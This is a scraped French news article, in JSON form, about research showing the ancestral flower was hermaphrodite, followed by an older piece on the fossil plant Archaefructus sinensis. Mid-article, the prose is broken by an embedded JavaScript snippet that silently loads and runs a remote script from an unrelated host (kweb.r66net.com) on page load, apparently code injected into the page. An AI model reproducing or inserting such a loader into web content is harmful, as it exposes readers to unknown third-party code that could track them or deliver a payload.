{"title": "L'ancêtre de toutes les fleurs était hermaphrodite", "newspaper": "Futura Sciences", "author": "CNRS", "date_publi": "12/08/2017", "content": "L'ancêtre de toutes les fleurs vient d'être identifié. Une équipe de 36 chercheurs, issus de 13 pays, en a dressé un portrait-robot. Ces travaux apportent de nouveaux résultats quant à la structure des fleurs les plus anciennes, datant d'il y a 140 millions d'années. Ils remettent en question presque tout ce qui a été pensé et enseigné sur l'évolution florale jusqu'à maintenant. Ce qu'il faut retenir L’origine et l’évolution des premières plantes à fleurs, apparues il y a environ 140 millions d’années, demeurent l’une des plus grandes énigmes en biologie. Des chercheurs,  via  le projet  eFlower , ont construit, à partir des informations génétiques des différentes espèces, un arbre évolutif des plantes à fleurs. Parmi les surprises qui attendaient l’équipe, le modèle de cette fleur ancestrale montre qu’elle était hermaphrodite. Les plantes à fleurs ( angiospermes ) forment le groupe de plantes le plus diversifié sur  Terre , avec plus de 300.000  espèces . Elles seraient apparues il y a environ 140 millions d'années, tard dans l'histoire de l'évolution des plantes, vers la fin de l'ère des  dinosaures . Depuis, elles ont connu néanmoins une diversification spectaculaire.  L'origine et l'évolution des premières plantes à fleurs, plus particulièrement celles de la fleur elle-même, restent encore aujourd'hui l'une des plus grandes énigmes en biologie, presque 140 ans après que  Charles Darwin  a qualifié d'  « abominable mystère »  leur développement rapide au  Crétacé . Le projet  eFlower  est un effort international sans précédent pour combiner les données sur la structure des fleurs avec le tout dernier  arbre  évolutif des  plantes à fleurs , construit à partir des informations  génétiques  des différentes espèces.  Voir aussi : On a retrouvé des fleurs fossilisées qui ont fleuri juste après les dinosaures Les résultats de cette étude, qui vient de paraître dans la revue  Nature Communications ,  apportent de nouveaux éléments sur les premiers stades de l'évolution des fleurs et offrent, pour la première fois, un scénario simple et plausible pour expliquer la diversité spectaculaire des formes florales.  Parmi les résultats les plus surprenants, figure un nouveau modèle, inédit pour la fleur ancestrale.  « Personne n'avait vraiment réfléchi aux premiers stades de l'évolution des fleurs de cette façon, et pourtant une grande partie de la diversité peut être expliquée de façon simple avec le nouveau scénario qui émerge de nos modèles » , explique Hervé Sauquet, de l'université Paris-Sud, qui a coordonné ces recherches. Arbre évolutif des plantes à fleurs. © H. Sauquet, J. Schönenberger, CNRS                               Vers une meilleure compréhension de l'histoire évolutive des fleurs Selon l'étude, la fleur ancestrale était  hermaphrodite , c'est-à-dire possédant à la fois des parties femelles (carpelles) et mâles ( étamines ) ainsi que plusieurs verticilles (cycles concentriques) d'organes ressemblant à des  pétales , organisés par groupes de trois. Environ 20 % des fleurs actuelles sont caractérisées par ces verticilles « trimères » mais en nombre plus réduit : par exemple, deux chez les tulipes, trois chez les magnolias.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Sexualité : l'évolution des plantes à fleurs « Ces résultats remettent en question presque tout ce qui a été pensé et enseigné sur l'évolution florale jusqu'à maintenant ! » , relève Jürg Schönenberger, professeur à l'université de Vienne et coauteur de l'étude avec Hervé Sauquet. En effet, il a longtemps été présumé que la fleur ancestrale avait tous ses organes arrangés en spirale. Malgré ces nouveaux éléments sur l'histoire évolutive des  plantes à fleurs , de nombreuses questions demeurent. Le registre  fossile  de ces plantes reste incomplet.  « Cette étude est un pas très important vers la compréhension nouvelle et de plus en plus sophistiquée de l'histoire évolutive des fleurs , précise Peter Crane, président de la fondation  Oaks Spring Garden  et collègue familier des résultats de l'étude.  Elle représente un progrès majeur et les résultats sur les fleurs les plus anciennes sont particulièrement étonnants ». Pour en savoir plus Archaefructus sinensis , l'ancêtre des fleurs ? Article du CIRS publié le 13 mai 2002 L'ancêtre des fleurs, des grains et des fruits pourrait avoir été une plante ayant vécu dans un lac de Chine il y a de cela 125 à 144 millions d'années. Dénommée  Archaefructus sinensis  et ne ressemblant à aucune espèce observée auparavant, elle  porte  les caractéristiques les plus primitives des plantes à fleurs, a déclaré David Dilcher, co-auteur d'un article sur le sujet paru le 3 mai dans la revue  Science . Cela change entièrement notre vision de ce qu'aurait été la plus vieille de toutes les plantes à fleurs. En effet, les botanistes ont longtemps considéré une plante de Nouvelle-Calédonie, ressemblant au magnolia, comme la plus ancienne plante à fleurs.  Archaefructus  aurait vécu en eau claire peu profonde, avec les fleurs et les graines s'étendant au-dessus de la surface de l'eau, selon Dilcher. Le fait d'avoir trouvé les fossiles de neuf  poissons  parmi les branches de la plante soutient la thèse d'une vie aquatique de la plante, qui renvoie au lis d'eau d'aujourd'hui. Cette découverte suggère que les plantes à fleurs ont débuté comme herbes se développant en eau peu profonde et étaient aptes à se reproduire rapidement, ce qui constitue un atout en termes de survie. Pas de vrais pétales pour les fleurs d' Archaefructus Les fleurs d' Archaefructus  n'étaient pas dotées de vrais pétales. Elles ne fonctionnaient qu'en tant qu'unité reproductrice. Il est pourtant question de plante à fleurs en raison de la graine enclose dans les carpelles du fruit, précise Dilcher. Le carpelle est la partie femelle de la fleur. Les plantes à fleurs auraient plus tard développé des pétales colorés et des fruits savoureux et parfumés afin de soutenir la reproduction. Les bonnes odeurs et les  couleurs  éclatantes des fleurs attirent les  insectes , ce qui favorise la pollinisation, ainsi que les animaux, qui consomment les fruits des plantes et aident à la dissémination des graines. La découverte éclaire l'évolution humaine elle-même, fait remarquer Dilcher. L'Homme a co-évolué avec les plantes à fleurs et en dépend aujourd'hui pour sa survie, en termes d'alimentation, de fibres notamment, ajoute-t-il. ", "theme": "planete"}